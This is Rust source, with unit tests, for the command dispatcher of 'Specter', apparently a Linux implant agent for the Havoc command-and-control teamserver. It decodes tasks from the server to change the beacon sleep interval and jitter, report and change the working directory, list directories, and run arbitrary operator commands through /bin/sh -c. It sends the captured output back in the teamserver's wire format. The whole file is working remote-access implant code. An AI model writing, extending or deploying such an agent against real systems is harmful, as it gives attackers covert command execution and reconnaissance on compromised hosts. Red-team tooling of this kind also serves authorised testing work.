//! Command dispatch and handler implementations for the Specter agent.
//!
//! Routes incoming server task packages to platform-native handler functions and
//! assembles the big-endian response payloads expected by the Havoc teamserver.
//!
//! # Wire endianness
//!
//! * **Server → agent** (incoming task payload): integers are **little-endian**
//!   (`binary.LittleEndian` in the Go teamserver's `BuildPayloadMessage`).
//! * **Agent → server** (outgoing response payload): integers are **big-endian**
//!   (`Int32ToBuffer` in the Demon C agent's `Package.c`, parsed by the Go
//!   teamserver's big-endian `parser.NewParser`).

use std::process::Command as SysCommand;

use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonPackage, DemonProcessCommand,
};
use tracing::{info, warn};

use crate::config::SpecterConfig;

// ─── Result type ─────────────────────────────────────────────────────────────

/// Outcome of dispatching one decoded task package.
#[derive(Debug)]
pub enum DispatchResult {
    /// Send one response packet to the server.
    Respond(Response),
    /// Send multiple response packets (e.g., proc-info + captured output).
    MultiRespond(Vec<Response>),
    /// Cleanly terminate the agent process.
    Exit,
    /// Nothing to send back (no-job, unrecognised command, parse error, …).
    Ignore,
}

/// A single pending agent → server response, ready to be wrapped in a callback
/// envelope and sent over the transport.
#[derive(Debug, Clone)]
pub struct Response {
    /// Demon command ID for the outgoing packet header.
    pub command_id: u32,
    /// Payload bytes already serialised in big-endian wire format.
    pub payload: Vec<u8>,
}

impl Response {
    fn new(cmd: DemonCommand, payload: Vec<u8>) -> Self {
        Self { command_id: cmd.into(), payload }
    }
}

// ─── Top-level dispatch ───────────────────────────────────────────────────────

/// Route a single decoded [`DemonPackage`] to the appropriate handler.
///
/// The [`DispatchResult`] must be transmitted back to the server using the
/// `request_id` from the original package.
pub fn dispatch(package: &DemonPackage, config: &mut SpecterConfig) -> DispatchResult {
    let cmd = match DemonCommand::try_from(package.command_id) {
        Ok(c) => c,
        Err(_) => {
            warn!(command_id = package.command_id, "received unknown command ID — ignoring");
            return DispatchResult::Ignore;
        }
    };

    info!(command = ?cmd, request_id = package.request_id, "dispatching command");

    match cmd {
        DemonCommand::CommandNoJob | DemonCommand::CommandGetJob => DispatchResult::Ignore,
        DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
        DemonCommand::CommandFs => handle_fs(&package.payload),
        DemonCommand::CommandProc => handle_proc(&package.payload),
        DemonCommand::CommandExit => DispatchResult::Exit,
        // These are agent-to-server callbacks; ignore if received from server.
        DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
        _ => {
            info!(command = ?cmd, "unhandled command — ignoring");
            DispatchResult::Ignore
        }
    }
}

// ─── COMMAND_SLEEP (11) ──────────────────────────────────────────────────────

/// Handle a `CommandSleep` task: update the sleep configuration and echo it back.
///
/// Incoming payload (LE): `[delay_ms: u32][jitter_pct: u32]`
/// Outgoing payload (BE): `[delay_ms: u32][jitter_pct: u32]`
fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let delay = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse delay: {e}");
            return DispatchResult::Ignore;
        }
    };
    let jitter = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse jitter: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(delay_ms = delay, jitter_pct = jitter, "sleep interval updated");
    config.sleep_delay_ms = delay;
    config.sleep_jitter = jitter.min(100);

    let mut out = Vec::with_capacity(8);
    write_u32_be(&mut out, delay);
    write_u32_be(&mut out, jitter);
    DispatchResult::Respond(Response::new(DemonCommand::CommandSleep, out))
}

// ─── COMMAND_FS (15) ─────────────────────────────────────────────────────────

/// Dispatch a `CommandFs` task to the appropriate filesystem sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_fs(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandFs: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonFilesystemCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandFs: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandFs dispatch");

    match subcmd {
        DemonFilesystemCommand::GetPwd => handle_fs_pwd(subcmd_raw),
        DemonFilesystemCommand::Cd => handle_fs_cd(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Dir => handle_fs_dir(subcmd_raw, &payload[offset..]),
        _ => {
            info!(subcommand = ?subcmd, "CommandFs: unhandled subcommand — ignoring");
            DispatchResult::Ignore
        }
    }
}

/// `COMMAND_FS / GetPwd (9)` — return the current working directory.
///
/// Outgoing payload (BE): `[9: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_pwd(subcmd_raw: u32) -> DispatchResult {
    let path = match std::env::current_dir() {
        Ok(p) => p.display().to_string(),
        Err(e) => {
            warn!("GetPwd: current_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(path = %path, "GetPwd");

    let mut out = Vec::new();
    write_u32_be(&mut out, subcmd_raw);
    write_utf16le_be(&mut out, &path);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Cd (4)` — change the working directory.
///
/// Incoming args (LE): `[path: bytes (UTF-16LE)]`
/// Outgoing payload (BE): `[4: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Cd: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let path_str = decode_utf16le_null(&path_bytes);
    info!(path = %path_str, "Cd");

    if let Err(e) = std::env::set_current_dir(&path_str) {
        warn!("Cd: set_current_dir({path_str:?}) failed: {e}");
        return DispatchResult::Ignore;
    }

    let mut out = Vec::new();
    write_u32_be(&mut out, subcmd_raw);
    write_utf16le_be(&mut out, &path_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Dir (1)` — list a directory.
///
/// Incoming args (LE): `[file_explorer: u32][path: bytes (UTF-16LE)][subdirs: u32]…`
///
/// Outgoing payload (BE, list_only=false):
/// ```text
/// [1: u32][file_explorer=0: u32][list_only=0: u32][path: bytes]
/// [success: u32]
/// [dir_path: bytes][num_files: u32][num_dirs: u32][total_size: u64]
///   per entry: [name: bytes][is_dir: u32][size: u64][day: u32][month: u32][year: u32][min: u32][hour: u32]
/// ```
fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    // file_explorer flag (ignored on Linux)
    let _ = parse_u32_le(rest, &mut offset).unwrap_or(0);

    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Dir: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let raw_path = decode_utf16le_null(&path_bytes);

    // Resolve actual directory path (strip trailing wildcard/dot)
    let dir_path = if raw_path.is_empty() || raw_path == "." || raw_path == "./*" {
        match std::env::current_dir() {
            Ok(p) => p.display().to_string(),
            Err(e) => {
                warn!("Dir: current_dir failed: {e}");
                return DispatchResult::Ignore;
            }
        }
    } else {
        raw_path.trim_end_matches('*').trim_end_matches('/').to_string()
    };

    let entries = match std::fs::read_dir(&dir_path) {
        Ok(e) => e,
        Err(e) => {
            warn!(path = %dir_path, "Dir: read_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut files: Vec<(String, bool, u64)> = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let meta = entry.metadata().ok();
        let is_dir = meta.as_ref().is_some_and(|m| m.is_dir());
        let size = meta.as_ref().map_or(0, |m| m.len());
        files.push((name, is_dir, size));
    }

    let num_files = files.iter().filter(|(_, d, _)| !d).count() as u32;
    let num_dirs = files.iter().filter(|(_, d, _)| *d).count() as u32;
    let total_size: u64 = files.iter().filter(|(_, d, _)| !d).map(|(_, _, s)| *s).sum();

    let mut out = Vec::new();
    write_u32_be(&mut out, subcmd_raw); // subcommand = 1
    write_u32_be(&mut out, 0); // file_explorer = false
    write_u32_be(&mut out, 0); // list_only = false
    write_utf16le_be(&mut out, &dir_path); // start path
    write_u32_be(&mut out, 1); // success = true

    // Single directory group
    write_utf16le_be(&mut out, &dir_path);
    write_u32_be(&mut out, num_files);
    write_u32_be(&mut out, num_dirs);
    out.extend_from_slice(&total_size.to_be_bytes());

    for (name, is_dir, size) in &files {
        write_utf16le_be(&mut out, name);
        write_u32_be(&mut out, u32::from(*is_dir));
        out.extend_from_slice(&size.to_be_bytes());
        // Placeholder timestamps (day/month/year/minute/hour)
        write_u32_be(&mut out, 1);
        write_u32_be(&mut out, 1);
        write_u32_be(&mut out, 2024);
        write_u32_be(&mut out, 0);
        write_u32_be(&mut out, 0);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

// ─── COMMAND_PROC (0x1010) ────────────────────────────────────────────────────

/// Dispatch a `CommandProc` task to the appropriate process sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_proc(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandProc: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonProcessCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandProc: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandProc dispatch");

    match subcmd {
        DemonProcessCommand::Create => handle_proc_create(subcmd_raw, &payload[offset..]),
        _ => {
            info!(subcommand = ?subcmd, "CommandProc: unhandled subcommand — ignoring");
            DispatchResult::Ignore
        }
    }
}

/// `COMMAND_PROC / Create (4)` — execute a command via the native shell.
///
/// The Havoc client sends Windows paths (`cmd.exe /c <cmd>`); on Linux we
/// strip the `/c ` prefix and invoke `/bin/sh -c <cmd>` instead.
///
/// Incoming args (LE):
/// `[state: u32][path: bytes (UTF-16LE)][args: bytes (UTF-16LE)][piped: u32][verbose: u32]`
///
/// Returns two responses (both using the original `request_id`):
/// 1. `CommandProc` — process metadata (path, PID, success, piped, verbose)
/// 2. `CommandOutput` — captured stdout + stderr
fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let process_state = parse_u32_le(rest, &mut offset).unwrap_or(0);

    let process_path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_path = decode_utf16le_null(&process_path_bytes);

    let process_args_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process args: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_args_raw = decode_utf16le_null(&process_args_bytes);

    let piped = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let verbose = parse_u32_le(rest, &mut offset).unwrap_or(0);

    info!(
        path = %process_path,
        args = %process_args_raw,
        piped,
        verbose,
        state = process_state,
        "ProcCreate: executing shell command"
    );

    // Translate Windows cmd.exe invocation to a POSIX shell command.
    let shell_cmd = translate_to_shell_cmd(&process_path, &process_args_raw);
    info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");

    let sys_output = SysCommand::new("/bin/sh").arg("-c").arg(&shell_cmd).output();

    let (success, pid, output_bytes) = match sys_output {
        Ok(o) => {
            let mut combined = o.stdout;
            if !o.stderr.is_empty() {
                if !combined.is_empty() {
                    combined.push(b'\n');
                }
                combined.extend_from_slice(&o.stderr);
            }
            (true, std::process::id(), combined)
        }
        Err(e) => {
            warn!("ProcCreate: /bin/sh execution failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes())
        }
    };

    // Response 1: COMMAND_PROC with process metadata
    // BE format: [subcmd][path bytes][pid][success][piped][verbose]
    let mut proc_payload = Vec::new();
    write_u32_be(&mut proc_payload, subcmd_raw);
    write_utf16le_be(&mut proc_payload, &process_path);
    write_u32_be(&mut proc_payload, pid);
    write_u32_be(&mut proc_payload, u32::from(success));
    write_u32_be(&mut proc_payload, piped);
    write_u32_be(&mut proc_payload, verbose);

    // Response 2: COMMAND_OUTPUT with captured output
    // BE format: [output bytes (UTF-8, length-prefixed)]
    let mut out_payload = Vec::new();
    write_bytes_be(&mut out_payload, &output_bytes);

    DispatchResult::MultiRespond(vec![
        Response::new(DemonCommand::CommandProc, proc_payload),
        Response::new(DemonCommand::CommandOutput, out_payload),
    ])
}

/// Convert a Windows-style process invocation to a POSIX shell command string.
///
/// The Havoc `shell` client command sends `cmd.exe` as the process path and
/// `/c <command>` as the arguments.  On Linux we strip the `/c ` prefix and
/// run the remainder with `/bin/sh`.  For any other invocation we fall back to
/// running the path directly with the given arguments.
fn translate_to_shell_cmd(path: &str, args: &str) -> String {
    let args_lower = args.to_ascii_lowercase();
    if args_lower.starts_with("/c ") {
        // Typical cmd.exe /c <shell command> path
        return args[3..].to_string();
    }
    if args_lower.starts_with("/c") && args.len() > 2 {
        return args[2..].trim_start().to_string();
    }
    // Not a cmd.exe style invocation: run path with args directly.
    if args.is_empty() { path.to_string() } else { format!("{path} {args}") }
}

// ─── Payload parsing helpers (server → agent, little-endian) ─────────────────

/// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
fn parse_u32_le(buf: &[u8], offset: &mut usize) -> Result<u32, &'static str> {
    if buf.len() < *offset + 4 {
        return Err("buffer too short for u32 LE");
    }
    let val = u32::from_le_bytes(
        buf[*offset..*offset + 4].try_into().map_err(|_| "slice-to-array conversion failed")?,
    );
    *offset += 4;
    Ok(val)
}

/// Parse a length-prefixed byte slice: `[u32 LE length][bytes…]`.
fn parse_bytes_le(buf: &[u8], offset: &mut usize) -> Result<Vec<u8>, &'static str> {
    let len = parse_u32_le(buf, offset)? as usize;
    if buf.len() < *offset + len {
        return Err("buffer too short for payload bytes");
    }
    let bytes = buf[*offset..*offset + len].to_vec();
    *offset += len;
    Ok(bytes)
}

/// Decode a UTF-16LE byte slice to a `String`, stripping trailing NUL characters.
fn decode_utf16le_null(bytes: &[u8]) -> String {
    let words: Vec<u16> = bytes.chunks_exact(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();
    String::from_utf16_lossy(&words).trim_end_matches('\0').to_string()
}

// ─── Payload serialisation helpers (agent → server, big-endian) ──────────────

/// Append a `u32` in big-endian byte order.
fn write_u32_be(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_be_bytes());
}

/// Append a length-prefixed byte slice: `[u32 BE length][bytes…]`.
fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
    #[allow(clippy::cast_possible_truncation)]
    let len = data.len() as u32;
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(data);
}

/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
fn write_utf16le_be(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    write_bytes_be(buf, &utf16);
}

// ─── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::demon::DemonPackage;

    // ── Helpers ──────────────────────────────────────────────────────────────

    /// Build a LE-encoded u32 + u32 payload (used for CommandSleep tests).
    fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&a.to_le_bytes());
        v.extend_from_slice(&b.to_le_bytes());
        v
    }

    /// Build a LE-encoded payload with a single u32 subcommand (for CommandFs/Proc).
    fn le_subcmd(subcmd: u32) -> Vec<u8> {
        subcmd.to_le_bytes().to_vec()
    }

    /// Build a LE length-prefixed UTF-16LE byte payload for a string.
    fn le_utf16le_payload(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> =
            s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    // ── parse_u32_le ─────────────────────────────────────────────────────────

    #[test]
    fn parse_u32_le_reads_correct_value() {
        let buf = [0x01, 0x00, 0x00, 0x00]; // 1 in LE
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("parse"), 1);
        assert_eq!(offset, 4);
    }

    #[test]
    fn parse_u32_le_advances_offset() {
        let buf = [0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00];
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("first"), 1);
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("second"), 2);
    }

    #[test]
    fn parse_u32_le_short_buffer_returns_err() {
        let buf = [0x01, 0x00, 0x00]; // only 3 bytes
        let mut offset = 0;
        assert!(parse_u32_le(&buf, &mut offset).is_err());
    }

    // ── parse_bytes_le ───────────────────────────────────────────────────────

    #[test]
    fn parse_bytes_le_reads_length_prefixed_slice() {
        let data: &[u8] = &[0xAA, 0xBB];
        let mut buf = (data.len() as u32).to_le_bytes().to_vec();
        buf.extend_from_slice(data);
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert_eq!(result, data);
        assert_eq!(offset, 6);
    }

    #[test]
    fn parse_bytes_le_empty_payload_is_ok() {
        let buf = 0u32.to_le_bytes();
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert!(result.is_empty());
    }

    // ── decode_utf16le_null ──────────────────────────────────────────────────

    #[test]
    fn decode_utf16le_null_strips_null_terminator() {
        // "Hi\0" encoded as UTF-16LE
        let encoded: Vec<u8> = "Hi\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert_eq!(decode_utf16le_null(&encoded), "Hi");
    }

    #[test]
    fn decode_utf16le_null_handles_empty_slice() {
        assert_eq!(decode_utf16le_null(&[]), "");
    }

    // ── write_utf16le_be ─────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_be_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le_be(&mut buf, s);

        // First 4 bytes: BE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_be_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── handle_sleep ─────────────────────────────────────────────────────────

    #[test]
    fn handle_sleep_updates_config_and_echoes_values() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(3000, 25);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
        let result = dispatch(&package, &mut config);

        assert_eq!(config.sleep_delay_ms, 3000);
        assert_eq!(config.sleep_jitter, 25);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSleep));
        // Payload: [3000 BE][25 BE]
        let expected_delay = 3000u32.to_be_bytes();
        let expected_jitter = 25u32.to_be_bytes();
        assert_eq!(&resp.payload[0..4], &expected_delay);
        assert_eq!(&resp.payload[4..8], &expected_jitter);
    }

    #[test]
    fn handle_sleep_clamps_jitter_to_100() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(1000, 150); // jitter > 100
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        dispatch(&package, &mut config);
        assert_eq!(config.sleep_jitter, 100);
    }

    #[test]
    fn handle_sleep_short_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs pwd ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_pwd_returns_non_empty_path() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(9); // GetPwd = 9
        let package = DemonPackage::new(DemonCommand::CommandFs, 7, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // First 4 bytes BE = subcommand (9)
        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 9);

        // Remaining = length-prefixed UTF-16LE path
        assert!(resp.payload.len() > 8, "payload should contain a path");
    }

    // ── handle_fs cd ─────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_cd_changes_directory_and_echoes_path() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(4); // Cd = 4
        payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
        let package = DemonPackage::new(DemonCommand::CommandFs, 8, payload);

        let result = dispatch(&package, &mut config);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 4);

        // Decode echoed path from response
        let path_len = u32::from_be_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let decoded = decode_utf16le_null(&resp.payload[8..8 + path_len]);
        assert_eq!(decoded, tmp_str);
    }

    #[test]
    fn handle_fs_cd_missing_path_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(4); // Cd = 4, but no path bytes follow
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs dir ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_dir_returns_non_empty_listing() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(1); // Dir = 1
        // file_explorer flag
        payload.extend_from_slice(&0u32.to_le_bytes());
        // path
        payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
        let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);

        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── handle_proc create / shell ────────────────────────────────────────────

    #[test]
    fn handle_proc_create_shell_returns_two_responses() {
        let cmd = "echo hello";
        let mut config = SpecterConfig::default();

        // Build the payload for CommandProc / ProcCreate (subcommand=4)
        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
        payload.extend_from_slice(&0u32.to_le_bytes()); // state
        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe")); // path
        payload.extend_from_slice(&le_utf16le_payload(&format!("/c {cmd}"))); // args
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false

        let package = DemonPackage::new(DemonCommand::CommandProc, 99, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::MultiRespond(resps) = result else {
            panic!("expected MultiRespond, got {result:?}");
        };
        assert_eq!(resps.len(), 2);
        assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(resps[1].command_id, u32::from(DemonCommand::CommandOutput));

        // The output payload should contain "hello"
        // payload[0..4] = BE length, payload[4..] = output bytes
        let out_payload = &resps[1].payload;
        let out_len = u32::from_be_bytes(out_payload[0..4].try_into().expect("len")) as usize;
        let out_str = std::str::from_utf8(&out_payload[4..4 + out_len])
            .expect("utf8 output")
            .trim()
            .to_string();
        assert_eq!(out_str, "hello");
    }

    #[test]
    fn translate_to_shell_cmd_strips_cmd_exe_prefix() {
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/c whoami"), "whoami");
        assert_eq!(translate_to_shell_cmd("c:\\windows\\system32\\cmd.exe", "/C ls -la"), "ls -la");
    }

    #[test]
    fn translate_to_shell_cmd_non_cmd_exe_uses_path_and_args() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/ls", "-la /tmp"), "/usr/bin/ls -la /tmp");
    }

    #[test]
    fn translate_to_shell_cmd_empty_args_returns_path() {
        assert_eq!(translate_to_shell_cmd("/usr/bin/id", ""), "/usr/bin/id");
    }

    // ── unknown/unhandled commands ────────────────────────────────────────────

    #[test]
    fn dispatch_unknown_command_id_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage { command_id: 0xDEAD_0000, request_id: 0, payload: vec![] };
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn dispatch_no_job_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 0, vec![]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
    }

    #[test]
    fn dispatch_exit_returns_exit() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Exit));
    }
}
